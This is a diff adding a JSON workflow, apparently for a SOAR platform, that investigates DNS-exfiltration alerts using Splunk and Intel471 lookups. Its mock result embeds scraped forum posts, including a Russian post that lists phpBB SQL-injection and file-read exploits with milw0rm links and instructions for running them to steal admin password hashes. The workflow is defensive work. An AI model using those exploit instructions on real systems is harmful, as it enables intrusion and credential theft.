@@ -1,0 +1,1072 @@
+{
+    "@type": "Workflow",
+    "triggerLimit": null,
+    "name": "Investigate DNS Exfiltration",
+    "aliasName": null,
+    "tag": "#ManualAction",
+    "description": "Investigates an alert ingested from Splunk using threat intelligence reports retrieved from Intel471 and by querying Splunk. Containment tasks are performed if malicious activity is found.",
+    "isActive": false,
+    "debug": false,
+    "singleRecordExecution": false,
+    "remoteExecutableFlag": false,
+    "parameters": [],
+    "synchronous": false,
+    "lastModifyDate": 1636433420,
+    "collection": "\/api\/3\/workflow_collections\/59667fcc-7feb-4ba4-a5a2-e03a9287f857",
+    "versions": [],
+    "triggerStep": "\/api\/3\/workflow_steps\/ce93b6d9-c5cb-4837-b635-48db57e639e7",
+    "steps": [
+        {
+            "@type": "WorkflowStep",
+            "name": "Link Attachment",
+            "description": null,
+            "arguments": {
+                "for_each": {
+                    "item": "{{vars.steps.Create_Attachment_from_the_report_files}}",
+                    "condition": ""
+                },
+                "resource": {
+                    "alerts": "['{{vars.alertID}}']"
+                },
+                "_showJson": false,
+                "collection": "{{vars.item.data['@id']}}",
+                "collectionType": "\/api\/3\/attachments",
+                "step_variables": []
+            },
+            "status": null,
+            "top": "1060",
+            "left": "940",
+            "stepType": "\/api\/3\/workflow_step_types\/b593663d-7d13-40ce-a3a3-96dece928722",
+            "uuid": "674113d6-f6cd-4706-8b2f-4f4a3b3a5283",
+            "id": 3219
+        },
+        {
+            "@type": "WorkflowStep",
+            "name": "No Action Needed",
+            "description": null,
+            "arguments": {
+                "params": [],
+                "version": "2.1.0",
+                "connector": "cyops_utilities",
+                "operation": "no_op",
+                "operationTitle": "Utils: No Operation",
+                "step_variables": []
+            },
+            "status": null,
+            "top": "874",
+            "left": "1460",
+            "stepType": "\/api\/3\/workflow_step_types\/0109f35d-090b-4a2b-bd8a-94cbc3508562",
+            "uuid": "55a9ae5b-b4fe-49e1-a1d9-2f224f4a7cfc",
+            "id": 3220
+        },
+        {
+            "@type": "WorkflowStep",
+            "name": "Add Note_ No Report Found",
+            "description": null,
+            "arguments": {
+                "resource": {
+                    "type": {
+                        "id": 247,
+                        "@id": "\/api\/3\/picklists\/ff599189-3eeb-4c86-acb0-a7915e85ac3b",
+                        "icon": null,
+                        "uuid": "ff599189-3eeb-4c86-acb0-a7915e85ac3b",
+                        "@type": "Picklist",
+                        "color": null,
+                        "display": "Comment",
+                        "@context": "\/api\/3\/contexts\/Picklist",
+                        "listName": "\/api\/3\/picklist_names\/0841c1eb-a0a3-4abd-b29c-9f68e4d9b14f",
+                        "itemValue": "Comment",
+                        "orderIndex": 1
+                    },
+                    "alerts": "['{{vars.alertID}}']",
+                    "people": [],
+                    "tenant": "{{vars.input.records[0].tenant['@id']}}",
+                    "content": "<p><em><span style=\"color: #ff0000;\"><span style=\"color: #00ff00;\"><span style=\"color: #ffffff;\"><span style=\"color: #00ff00;\">No Threat Intel Reports <\/span><\/span><\/span><\/span>found<span style=\"color: #ff0000;\"><span style=\"color: #00ff00;\"><span style=\"color: #ffffff;\"> for<\/span><\/span><\/span><span style=\"color: #ff0000;\"><span style=\"color: #00ff00;\"><span style=\"color: #ffffff;\">,<\/span><\/span><\/span><\/em><em><span style=\"color: #ff0000;\"><span style=\"color: #00ff00;\">&nbsp;<\/span><\/span><span style=\"color: #ffcc00;\">{{vars.alertURL}}<\/span><\/em><strong><span style=\"color: #ff0000;\"><br><\/span><\/strong><\/p>",
+                    "__replace": "",
+                    "isImportant": false,
+                    "peopleUpdated": false
+                },
+                "_showJson": false,
+                "operation": "Overwrite",
+                "collection": "\/api\/3\/comments",
+                "__recommend": [],
+                "fieldOperation": {
+                    "recordTags": "Overwrite"
+                },
+                "step_variables": []
+            },
+            "status": null,
+            "top": "620",
+            "left": "1348",
+            "stepType": "\/api\/3\/workflow_step_types\/2597053c-e718-44b4-8394-4d40fe26d357",
+            "uuid": "c326df53-9e72-428d-a8ba-b5aa44aae662",
+            "id": 3221
+        },
+        {
+            "@type": "WorkflowStep",
+            "name": "Create Attachment from the report files",
+            "description": null,
+            "arguments": {
+                "name": "CyOps Utilities",
+                "params": {
+                    "name": "{{vars.item.data.filename}}",
+                    "filename": "{{vars.item.data.filename}}",
+                    "description": "",
+                    "request_headers": "{\"Authorization\" : \"{{vars.request.headers.authorization}}\"}",
+                    "multipart_headers": "",
+                    "extra_multipart_fields": ""
+                },
+                "version": "2.0.0",
+                "for_each": {
+                    "item": "{{vars.steps.Save_Reports_as_Cyops_File}}",
+                    "condition": ""
+                },
+                "connector": "cyops_utilities",
+                "operation": "create_cyops_attachment",
+                "operationTitle": "File: Create CyOPs Attachment from File",
+                "step_variables": []
+            },
+            "status": null,
+            "top": "920",
+            "left": "940",
+            "stepType": "\/api\/3\/workflow_step_types\/0bfed618-0316-11e7-93ae-92361f002671",
+            "uuid": "ee654143-dded-4942-83b0-017d015cfedd",
+            "id": 3222
+        },
+        {
+            "@type": "WorkflowStep",
+            "name": "Raise Alerts Severity",
+            "description": null,
+            "arguments": {
+                "message": {
+                    "tenant": "{{vars.input.records[0].tenant['@id']}}",
+                    "content": "<p><span style=\"font-size: 15px; color: #DE7A13;\" class=\"fa fa-exclamation-triangle\"><\/span>&nbsp;<em>Attaching Threat Intel Reports and raising Alert Severity To <span style=\"color: #ff6600;\"><strong>High<\/strong><\/span><\/em>..<\/p>",
+                    "records": ""
+                },
+                "resource": {
+                    "severity": {
+                        "id": 88,
+                        "@id": "\/api\/3\/picklists\/40187287-89fc-4e9c-b717-e9443d57eedb",
+                        "icon": null,
+                        "@type": "Picklist",
+                        "color": "#DE7A13",
+                        "display": "High",
+                        "listName": "\/api\/3\/picklist_names\/4e80cba3-032f-48b4-ac03-17e3ec247aac",
+                        "itemValue": "High",
+                        "orderIndex": 3
+                    }
+                },
+                "_showJson": false,
+                "operation": "Append",
+                "collection": "{{vars.alertID}}",
+                "__recommend": [],
+                "collectionType": "\/api\/3\/alerts",
+                "fieldOperation": {
+                    "recordTags": "Append"
+                },
+                "step_variables": []
+            },
+            "status": null,
+            "top": "1200",
+            "left": "940",
+            "stepType": "\/api\/3\/workflow_step_types\/b593663d-7d13-40ce-a3a3-96dece928722",
+            "uuid": "a110f182-98ad-41e2-8015-7d19133a658b",
+            "id": 3223
+        },
+        {
+            "@type": "WorkflowStep",
+            "name": "Is Indicator Malicious",
+            "description": null,
+            "arguments": {
+                "conditions": [
+                    {
+                        "option": "Yes",
+                        "step_iri": "\/api\/3\/workflow_steps\/65ab6e0c-ad90-41d6-b6ae-be00839431c1",
+                        "condition": "{{ vars.steps.Lookup_Indicators_Reputation.data[\"hydra:totalItems\"] > 0 }}"
+                    },
+                    {
+                        "option": "No",
+                        "step_iri": "\/api\/3\/workflow_steps\/a4aae29b-7fee-4079-9a66-006d4970ad6b",
+                        "condition": "{{ vars.steps.Lookup_Indicators_Reputation.data[\"hydra:totalItems\"] < 1 }}"
+                    }
+                ]
+            },
+            "status": null,
+            "top": "560",
+            "left": "400",
+            "stepType": "\/api\/3\/workflow_step_types\/12254cf5-5db7-4b1a-8cb1-3af081924b28",
+            "uuid": "45531c30-3f42-4dc1-875b-bfb688d375ab",
+            "id": 3224
+        },
+        {
+            "@type": "WorkflowStep",
+            "name": "Find sourceIP in Asset Inventory",
+            "description": null,
+            "arguments": {
+                "query": {
+                    "limit": 30,
+                    "logic": "AND",
+                    "filters": [
+                        {
+                            "type": "primitive",
+                            "field": "hostname",
+                            "value": "{{vars.alertHost}}",
+                            "operator": "eq"
+                        }
+                    ]
+                },
+                "module": "assets?$limit=30",
+                "step_variables": {
+                    "assetSerialNo": "{{vars.result[0].serialNumber}}",
+                    "assetHolderName": "{{vars.result[0].name}}"
+                }
+            },
+            "status": null,
+            "top": "140",
+            "left": "1680",
+            "stepType": "\/api\/3\/workflow_step_types\/b593663d-7d13-40ce-a3a3-96dece928770",
+            "uuid": "ea2368a7-673a-49c9-9e7a-652fd3162535",
+            "id": 3225
+        },
+        {
+            "@type": "WorkflowStep",
+            "name": "Start Investigation",
+            "description": null,
+            "arguments": {
+                "message": {
+                    "tags": [],
+                    "type": "\/api\/3\/picklists\/ff599189-3eeb-4c86-acb0-a7915e85ac3b",
+                    "tenant": "{{vars.input.records[0].tenant['@id']}}",
+                    "content": "Investigating Potential {{vars.input.records[0].type.itemValue}}, with following fields of interest:\n{% if vars.input.records[0].domain %}Domain: {{vars.input.records[0].domain -}}{% endif %}\n{% if vars.input.records[0].sourceIp %}SourceIP: {{ vars.input.records[0].sourceIp -}}{% endif %}\n{% if vars.input.records[0].destinationIp %}DestinationIP: {{vars.input.records[0].destinationIp -}}{% endif %}\n{% if vars.input.records[0].fileHash %}File Hash: {{vars.input.records[0].fileHash -}}{% endif %}\n{% if vars.input.records[0].computerName %}ComputerName: {{vars.input.records[0].computerName -}}{% endif %}\n{% if vars.input.records[0].processName %}Process: {{vars.input.records[0].processName -}}{% endif %}\n{% if vars.input.records[0].sourceProcess %}SourceProcess: {{vars.input.records[0].sourceProcess -}}{% endif %}",
+                    "records": ""
+                },
+                "resource": {
+                    "status": {
+                        "id": 113,
+                        "@id": "\/api\/3\/picklists\/758925e7-629c-46d8-89db-fb36f5fbe88a",
+                        "icon": null,
+                        "@type": "Picklist",
+                        "color": null,
+                        "display": "Investigating",
+                        "listName": "\/api\/3\/picklist_names\/33e964a9-d607-49f2-813c-7ce46141815a",
+                        "itemValue": "Investigating",
+                        "orderIndex": 2
+                    }
+                },
+                "_showJson": false,
+                "operation": "Append",
+                "collection": "{{vars.input.records[0]['@id']}}",
+                "__recommend": [],
+                "collectionType": "\/api\/3\/alerts",
+                "fieldOperation": {
+                    "recordTags": "Append"
+                },
+                "step_variables": []
+            },
+            "status": null,
+            "top": "140",
+            "left": "420",
+            "stepType": "\/api\/3\/workflow_step_types\/b593663d-7d13-40ce-a3a3-96dece928722",
+            "uuid": "ed21b55c-1e39-478d-925e-e72e706d4edb",
+            "id": 3226
+        },
+        {
+            "@type": "WorkflowStep",
+            "name": "Config",
+            "description": null,
+            "arguments": {
+                "alertID": "{{vars.input.records[0]['@id']}}",
+                "alertMetaData": "{{vars.input.records[0].sourceData}}",
+                "threatCategories": "[\"C2\u2215Generic-A\",\"Phishing\",\"Ransomware\",\"Malware\"]"
+            },
+            "status": null,
+            "top": "140",
+            "left": "60",
+            "stepType": "\/api\/3\/workflow_step_types\/04d0cf46-b6a8-42c4-8683-60a7eaa69e8f",
+            "uuid": "b80f32bf-d192-4ae2-9560-788f78768f66",
+            "id": 3227
+        },
+        {
+            "@type": "WorkflowStep",
+            "name": "Save Reports as Cyops File",
+            "description": null,
+            "arguments": {
+                "name": "CyOps Utilities",
+                "params": {
+                    "contents": "{{vars.item.data.researcherComments}}{{vars.item.data.rawText}}",
+                    "filename": "ThreatIntelReport_{{vars.item.data.dateOfInformation}}.html"
+                },
+                "version": "2.0.0",
+                "for_each": {
+                    "item": "{{vars.steps.Get_Detailed_Report}}",
+                    "condition": ""
+                },
+                "connector": "cyops_utilities",
+                "operation": "create_file_from_string",
+                "operationTitle": "File: Create File from String",
+                "step_variables": []
+            },
+            "status": null,
+            "top": "780",
+            "left": "940",
+            "stepType": "\/api\/3\/workflow_step_types\/0bfed618-0316-11e7-93ae-92361f002671",
+            "uuid": "d5f2d71c-91ae-42f9-a553-345cae1cacda",
+            "id": 3228
+        },
+        {
+            "@type": "WorkflowStep",
+            "name": "Is Report Found",
+            "description": null,
+            "arguments": {
+                "conditions": [
+                    {
+                        "option": "Yes",
+                        "step_iri": "\/api\/3\/workflow_steps\/e534f8a9-fb8a-4e66-9010-36d8a2c561e4",
+                        "condition": "{{ vars.lengthReports >=1 }}"
+                    },
+                    {
+                        "option": "No",
+                        "step_iri": "\/api\/3\/workflow_steps\/c326df53-9e72-428d-a8ba-b5aa44aae662",
+                        "condition": "{{ vars.lengthReports < 1 }}"
+                    }
+                ]
+            },
+            "status": null,
+            "top": "492",
+            "left": "1149",
+            "stepType": "\/api\/3\/workflow_step_types\/12254cf5-5db7-4b1a-8cb1-3af081924b28",
+            "uuid": "9954df6b-faad-46a1-9a2b-b397ab726eab",
+            "id": 3229
+        },
+        {
+            "@type": "WorkflowStep",
+            "name": "Wait For Enrichment",
+            "description": null,
+            "arguments": {
+                "delay": {
+                    "days": 0,
+                    "hours": 0,
+                    "weeks": 0,
+                    "minutes": 0,
+                    "seconds": 10
+                }
+            },
+            "status": null,
+            "top": "300",
+            "left": "400",
+            "stepType": "\/api\/3\/workflow_step_types\/6832e556-b9c7-497a-babe-feda3bd27dbf",
+            "uuid": "8c58bcb9-4ae3-49fa-972a-86a032131616",
+            "id": 3230
+        },
+        {
+            "@type": "WorkflowStep",
+            "name": "Add Finding Notes",
+            "description": null,
+            "arguments": {
+                "resource": {
+                    "alerts": "['{{vars.alertID}}']",
+                    "content": "<p><span class=\"fa fa-exclamation-triangle\"  style=\"font-size: 15px; color: #DE7A13;\"><\/span>&nbsp;<strong><span style=\"color: #ff0000;\">Malicious&nbsp;Activity Found From Host Event Data!<br \/><br \/><\/span><\/strong><em><span style=\"color: #ffffff;\">Asset ID:<\/span><\/em><strong><span style=\"color: #ff0000;\"><br \/><\/span><\/strong><span style=\"color: #ffffff;\">{{vars.assetSerialNo}}<br \/>-------------------------<\/span><br \/><em>Event Description:<\/em><br \/>{{vars.event_description}}<br \/>-------------------------<br \/><em>Threat Category:<\/em><br \/>{{vars.threat_category}}<\/p>",
+                    "__replace": ""
+                },
+                "_showJson": false,
+                "operation": "Overwrite",
+                "collection": "\/api\/3\/comments",
+                "fieldOperation": {
+                    "recordTags": "Overwrite"
+                },
+                "step_variables": []
+            },
+            "status": null,
+            "top": "926",
+            "left": "1874",
+            "stepType": "\/api\/3\/workflow_step_types\/2597053c-e718-44b4-8394-4d40fe26d357",
+            "uuid": "cc953580-74ac-4449-9faf-4af6d4108cc9",
+            "id": 3231
+        },
+        {
+            "@type": "WorkflowStep",
+            "name": "Get Detailed Report",
+            "description": null,
+            "arguments": {
+                "name": "Intel471",
+                "config": "eab3b291-b742-4002-a66a-d01b6ab25bcf",
+                "params": {
+                    "uid": "{{vars.item}}",
+                    "sort": "Latest"
+                },
+                "message": {
+                    "content": "<p><em>{{vars.lengthReports}}<\/em> <span style=\"color: #ff0000;\"><strong>Threat Report(s) found<\/strong><\/span> <em>against the Indicator..<\/em><\/p>",
+                    "records": "['{{vars.alertID}}']"
+                },
+                "version": "1.0.0",
+                "for_each": {
+                    "item": "{{vars.reportID}}",
+                    "condition": ""
+                },
+                "connector": "intel471",
+                "operation": "search_report_by_uid",
+                "operationTitle": "Get Report using UID",
+                "step_variables": []
+            },
+            "status": null,
+            "top": "640",
+            "left": "940",
+            "stepType": "\/api\/3\/workflow_step_types\/0bfed618-0316-11e7-93ae-92361f002671",
+            "uuid": "e534f8a9-fb8a-4e66-9010-36d8a2c561e4",
+            "id": 3232
+        },
+        {
+            "@type": "WorkflowStep",
+            "name": "Get Threat Intel Reports",
+            "description": null,
+            "arguments": {
+                "name": "Intel471",
+                "config": "eab3b291-b742-4002-a66a-d01b6ab25bcf",
+                "params": {
+                    "days": "",
+                    "from": "",
+                    "sort": "",
+                    "until": "",
+                    "interested": [
+                        "Iocs",
+                        "Reports"
+                    ],
+                    "global_search": "text={{vars.alertURL}}"
+                },
+                "message": {
+                    "content": "<p><em>Querying <strong>Threat Intel Platforms<\/strong> to check if the URL\/IP is found as&nbsp;a malicious suspect in Reports\/IOC Feeds..<\/em><\/p>",
+                    "records": "['{{vars.alertID}}']"
+                },
+                "version": "1.0.0",
+                "connector": "intel471",
+                "operation": "global_search",
+                "mock_result": "{\"data\":\n{\n          \"Iocs\": [],\n          \"Actors\": [],\n          \"Reports\": [],\n          \"Posts\": [\n            {\n              \"links\": {\n                \"forum\": {\n                  \"name\": \"mpgh.net\",\n                  \"uid\": \"20d135f0f28185b84a4cf7aa51f29500\",\n                  \"description\": \"\"\n                },\n                \"authorActor\": {\n                  \"handle\": \"[MPGH]Joker\",\n                  \"uid\": \"f7c6de8ea10e43c1c6c48399abd78faa\"\n                },\n                \"thread\": {\n                  \"uid\": \"45028da045b7c90557ded577b659b6a4\",\n                  \"topic\": \"Is there a way to see the directories of a website or files of a website?\",\n                  \"count\": 6\n                }\n              },\n              \"uid\": \"bbd79d97f4b6432ae7227933ed2b5857\",\n              \"message\": \"<article class=\\\"forumPost\\\">\\n    \\t\\t\\t\\t\\t\\t\\n\\n\\t\\t\\t\\t\\t\\t\\t\\n\\t\\n\\t\\t\\n    <aside>\\n        <h6>Allura<\/h6>\\n        <blockquote>\\n            .html is still a file though.\\n            <br>\\n            \\n            <br>\\n            I know an error page will come up. For example.\\n            <br>\\n            \\n            <br>\\n            1. You have a brand new domain called <a>www.test.com [https:\/\/www.test.com]\\n\\t\\t\\t\\t\\t<\/a>\\n            <br>\\n            \\n            <br>\\n            2. Your homepage is <a>www.test.com\/home.html [https:\/\/www.test.com\/home.html]\\n\\t\\t\\t\\t\\t<\/a> (the entire code for this page is just \\\"&lt;b&gt;hello world&lt;\/b&gt;\\\").\\n            <br>\\n            \\n            <br>\\n            3. You have a directory \/abc\/123\/xyz\/test\/random\/, In this directory you have a secret file called lol.html. So the link is:\\n            <br>\\n            \\tCode:\\n\\t\\n            <pre>www.test.com\/abc\/123\/xyz\/test\/random\/lol.html<\/pre>\\n            In the lol.html it says \\\"&lt;b&gt;You found my secret page&lt;\/b&gt;\\\"\\n            <br>\\n            \\n            <br>\\n            4. I'm trying to find your secret page. All I know is that you own <a>www.test.com [https:\/\/www.test.com]\\n\\t\\t\\t\\t\\t<\/a> and your home page is <a>www.test.com\/home.html [https:\/\/www.test.com\/home.html]\\n\\t\\t\\t\\t\\t<\/a> . You challenge me to find your secret page. Can I find it without \\\"bruteforce\\\" (trying different combinations of directories and pages, file extensions etc)?\\n        <\/blockquote>\\n    <\/aside>\\n    \\t\\nOnly way is through a link or by listing the directory. But most sites that offer hosting disable directory listings already so they won't be able to find it unless they guess or get it linked to them. for a html file as long as its named something other than index.html should be fine and it wont load up immediately. Hope this is the answer you were looking for\\n\\t\\t\\t\\t\\t\\t\\n\\t\\t\\t\\t\\t\\n<\/article>\",\n              \"lastUpdated\": 1533828932607,\n              \"date\": 1532802600000\n            },\n            {\n              \"links\": {\n                \"forum\": {\n                  \"name\": \"mpgh.net\",\n                  \"uid\": \"20d135f0f28185b84a4cf7aa51f29500\",\n                  \"description\": \"\"\n                },\n                \"authorActor\": {\n                  \"handle\": \"[MPGH]Allura\",\n                  \"uid\": \"dce58f4c1e6641c980ed9405afceac3f\"\n                },\n                \"thread\": {\n                  \"uid\": \"45028da045b7c90557ded577b659b6a4\",\n                  \"topic\": \"Is there a way to see the directories of a website or files of a website?\",\n                  \"count\": 6\n                }\n              },\n              \"uid\": \"0eef0b6ccb7da34314d2eea32b0f9e10\",\n              \"message\": \"<article class=\\\"forumPost\\\">\\n    \\t\\t\\t\\t\\t\\t\\n\\n\\t\\t\\t\\t\\t\\t\\t\\n\\t\\n\\t\\t\\n    <aside>\\n        <h6>Joker<\/h6>\\n        <blockquote>\\n            <br>\\n            \\n            <br>\\n            can you be a little bit more specific. if you're asking if they'll see that file? if you're they'll only see it as a page since its marked as .html if it doesn't exist than it should show up for example with a error page \\n            <br>\\n            jok3r.cc\/jgfnghjkfgnhfgh\/ &lt; Example\\n        <\/blockquote>\\n    <\/aside>\\n    \\t\\n.html is still a file though.\\n    <br>\\n    \\n    <br>\\n    I know an error page will come up. For example.\\n    <br>\\n    \\n    <br>\\n    1. You have a brand new domain called <a>www.test.com [https:\/\/www.test.com]\\n\\t\\t\\t\\t\\t<\/a>\\n    <br>\\n    \\n    <br>\\n    2. Your homepage is <a>www.test.com\/home.html [https:\/\/www.test.com\/home.html]\\n\\t\\t\\t\\t\\t<\/a> (the entire code for this page is just \\\"&lt;b&gt;hello world&lt;\/b&gt;\\\").\\n    <br>\\n    \\n    <br>\\n    3. You have a directory \/abc\/123\/xyz\/test\/random\/, In this directory you have a secret file called lol.html. So the link is:\\n    <br>\\n    \\tCode:\\n\\t\\n    <pre>www.test.com\/abc\/123\/xyz\/test\/random\/lol.html<\/pre>\\n    In the lol.html it says \\\"&lt;b&gt;You found my secret page&lt;\/b&gt;\\\"\\n    <br>\\n    \\n    <br>\\n    4. I'm trying to find your secret page. All I know is that you own <a>www.test.com [https:\/\/www.test.com]\\n\\t\\t\\t\\t\\t<\/a> and your home page is <a>www.test.com\/home.html [https:\/\/www.test.com\/home.html]\\n\\t\\t\\t\\t\\t<\/a> . You challenge me to find your secret page. Can I find it without \\\"bruteforce\\\" (trying different combinations of directories and pages, file extensions etc)?\\n\\t\\t\\t\\t\\t\\t\\n\\t\\t\\t\\t\\t\\n<\/article>\",\n              \"lastUpdated\": 1533828932606,\n              \"date\": 1532802600000\n            },\n            {\n              \"links\": {\n                \"forum\": {\n                  \"name\": \"hackersoft.ru\",\n                  \"uid\": \"9766527f2b5d3e95d4a733fcfb77bd7e\",\n                  \"description\": \"\"\n                },\n                \"authorActor\": {\n                  \"handle\": \"DUX\",\n                  \"uid\": \"6d8fbb777681224914d2445728a75686\"\n                },\n                \"thread\": {\n                  \"uid\": \"46153d682124ff2f19d5e39bf8074540\",\n                  \"topic\": \"\u041e\u0431\u0437\u043e\u0440 \u0443\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u0435\u0439 phpBB\",\n                  \"count\": 1\n                }\n              },\n              \"uid\": \"d84781f4fae67692ffb0831a24112572\",\n              \"message\": \"<article class=\\\"forumPost\\\">\\n<b>\u041e\u0431\u0437\u043e\u0440 \u0443\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u0435\u0439 phpBB<\/b>\\n<br>\\n\\n<br>\\nphpBB &lt;= 2.0.4<br>\\n\u0426\u0435\u043b\u044c: \u043f\u0440\u043e\u0441\u043c\u043e\u0442\u0440 \u0441\u043e\u0434\u0435\u0440\u0436\u0438\u043c\u043e\u0433\u043e \u0444\u0430\u0439\u043b\u043e\u0432 \u043d\u0430 \u0441\u0435\u0440\u0432\u0435\u0440\u0435<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435: \u0411\u044b\u043b\u0430 \u0432\u044b\u043f\u0443\u0449\u0435\u043d\u0430 \u0432 2002. \u0414\u0430\u043d\u043d\u0430\u044f \u0432\u0435\u0440\u0441\u0438\u044f \u043f\u043e\u0447\u0442\u0438 \u043d\u0435 \u043f\u0440\u0438\u0441\u0443\u0442\u0441\u0442\u0432\u0443\u0435\u0442 \u0432 \u0441\u0435\u0442\u0438.<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435 \u0443\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u0438: \u041d\u0435\u043a\u043e\u0440\u0440\u0435\u043a\u0442\u043d\u0430\u044f \u043e\u0431\u0440\u0430\u0431\u043e\u0442\u043a\u0430 \u0432\u0445\u043e\u0434\u043d\u044b\u0445 \u043f\u0430\u0440\u0430\u043c\u0435\u0442\u0440\u043e\u0432 \u0432 Admin_Styles.PHP.<br>\\nExploit: <a>http:\/\/milw0rm.com\/id.php?id=47 [out.php?to=http%3A%2F%2Fmilw0rm.com%2Fid.php%3Fid%3D47]\\n\\t\\t\\t\\t\\t<\/a> \\n<br>\\n\\n<br>\\nphpBB &lt;= 2.0.5<br>\\n\u0426\u0435\u043b\u044c: \u043f\u0440\u043e\u0441\u043c\u043e\u0442\u0440 hash'a \u043f\u0430\u0440\u043e\u043b\u044f<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435: \u0412\u044b\u043f\u0443\u0449\u0435\u043d\u0430 \u0432 2002. \u0422\u0430\u043a\u0436\u0435 \u0440\u0435\u0434\u043a\u0430\u044f \u0432\u0435\u0440\u0441\u0438\u044f.<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435 \u0443\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u0438: \u0412\u043e\u0437\u043c\u043e\u0436\u043d\u043e\u0441\u0442\u044c \u0441\u043e\u0437\u0434\u0430\u043d\u0438\u044f \u0441\u043f\u0435\u0446\u0438\u0430\u043b\u044c\u043d\u043e\u0433\u043e SQL \u0437\u0430\u043f\u0440\u043e\u0441\u0430, \u0443\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u044c \u0441\u0443\u0449\u0435\u0441\u0442\u0432\u0443\u0435\u0442 \u0432 \u043f\u0440\u0438 \u043e\u0431\u0440\u0430\u0431\u043e\u0442\u043a\u0435 $topic_id. \u0412\u043e\u0437\u043c\u043e\u0436\u043d\u043e \u0434\u043e\u0431\u0430\u0432\u0438\u0442\u044c 2 \u0437\u0430\u043f\u0440\u043e\u0441, \u0442\u0435\u043c \u0441\u0430\u043c\u044b\u043c \u0437\u0430\u0445\u0432\u0430\u0442\u0438\u0442\u044c \u0445\u044d\u0448.<br>\\nExploit: <a>http:\/\/milw0rm.com\/id.php?id=44 [out.php?to=http%3A%2F%2Fmilw0rm.com%2Fid.php%3Fid%3D44]\\n\\t\\t\\t\\t\\t<\/a> \\n<br>\\n\u041f\u0440\u0438 \u0437\u0430\u043f\u0443\u0441\u043a\u0435 $remote = shift || '%'; - \u0438\u0437\u043c\u0435\u043d\u044f\u0435\u043c \u043d\u0430 \u043d\u0443\u0436\u043d\u044b\u0439 \u043d\u0430\u043f\u0440\u0438\u043c\u0435\u0440 255.255.255.255, $uid = shift || 2; - ID \u043d\u0443\u0436\u043d\u043e\u0433\u043e \u043d\u0430\u043c \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044f. \u0412 \u0444\u043e\u0440\u0443\u043c\u0430\u0445 phpBB ID \u0430\u0434\u043c\u0438\u043d\u0438\u0441\u0442\u0440\u0430\u0442\u043e\u0440\u0430 \u043f\u043e \u0443\u043c\u043e\u043b\u0447\u0430\u043d\u0438\u044e \\\"2\\\". \u0417\u0430\u0442\u0435\u043c \u043f\u0438\u0448\u0435\u043c \\\"perl exp.pl\\\"<br>\\nVideo: -<br>\\n\\n<br>\\nphpBB &lt;= 2.0.6<br>\\n\u0426\u0435\u043b\u044c: \u043f\u0440\u043e\u0441\u043c\u043e\u0442\u0440 hash'a \u043f\u0430\u0440\u043e\u043b\u044f<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435: \u0412\u044b\u043f\u0443\u0449\u0435\u043d\u0430 \u0432 2002. \u0422\u0430\u043a\u0436\u0435 \u0440\u0435\u0434\u043a\u0430\u044f \u0432\u0435\u0440\u0441\u0438\u044f.<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435 \u0443\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u0438: \u0412\u043e\u0437\u043c\u043e\u0436\u043d\u043e\u0441\u0442\u044c \u0441\u043e\u0437\u0434\u0430\u043d\u0438\u044f \u0441\u043f\u0435\u0446\u0438\u0430\u043b\u044c\u043d\u043e\u0433\u043e SQL \u0437\u0430\u043f\u0440\u043e\u0441\u0430, \u0443\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u044c \u0441\u0443\u0449\u0435\u0441\u0442\u0432\u0443\u0435\u0442 \u0432 \u043c\u043e\u0434\u0443\u043b\u0435 search.php.<br>\\nExploit: <a>http:\/\/milw0rm.com\/id.php?id=137 [out.php?to=http%3A%2F%2Fmilw0rm.com%2Fid.php%3Fid%3D137]\\n\\t\\t\\t\\t\\t<\/a>\\n<br>\\n\u0417\u0430\u043f\u0443\u0441\u043a\u0430\u0435\u043c \\\"perl exp.pl &lt;server&gt; &lt;folder&gt; &lt;user_id&gt; &lt;search_id&gt;\\\"<br>\\n\u0413\u0434\u0435 &lt;server&gt; - ip \u0441\u0435\u0440\u0432\u0435\u0440\u0430 (ip \u0441\u0435\u0440\u0432\u0435\u0440\u0430 \u043c\u043e\u0436\u043d\u043e \u0443\u0437\u043d\u0430\u0442\u044c \u0442\u0430\u043a \u041f\u0443\u0441\u043a-&gt;\u0412\u044b\u043f\u043e\u043b\u043d\u0438\u0442\u044c-&gt; \u043d\u0430\u0431\u0440\u0430\u0442\u044c cmd, \u0437\u0430\u0442\u0435\u043c \u0432 \u043f\u043e\u044f\u0432\u0438\u0432\u0435\u0448\u043c\u0441\u044f \u043e\u043a\u043d\u0435 \u043d\u0430\u0431\u0440\u0430\u0442\u044c \\\"ping test.com\\\"), &lt;folder&gt; - \u043f\u0430\u043f\u043a\u0430 \u0433\u0434\u0435 \u043d\u0430\u0445\u043e\u0434\u0438\u0442\u0441\u044f \u0441\u0430\u043c \u0444\u043e\u0440\u0443\u043c (\u043d\u0430\u043f\u0440\u0438\u043c\u0435\u0440 \u0435\u0441\u043b\u0438 \u0443 \u043d\u0430\u0441 <a>http:\/\/123.123.123.123\/forum\/index.php [out.php?to=http%3A%2F%2F123.123.123.123%2Fforum%2Findex.php]\\n\\t\\t\\t\\t\\t<\/a>, \u0432\u043c\u0435\u0441\u0442\u043e &lt;folder&gt; \u043f\u0438\u0448\u0435\u043c forum), &lt;user_id&gt; &lt;search_id&gt; - ID \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044f.<br>\\nVideo: <a>http:\/\/video.antichat.net\/videos\/kez\/phpbb_206_sql2.rar [out.php?to=http%3A%2F%2Fvideo.antichat.net%2Fvideos%2Fkez%2Fphpbb_206_sql2.rar]\\n\\t\\t\\t\\t\\t<\/a>\\n<br>\\n\\n<br>\\nphpBB &lt;= 2.0.8<br>\\n\u0426\u0435\u043b\u044c: \u043f\u043e\u0434\u043c\u0435\u043d\u0430 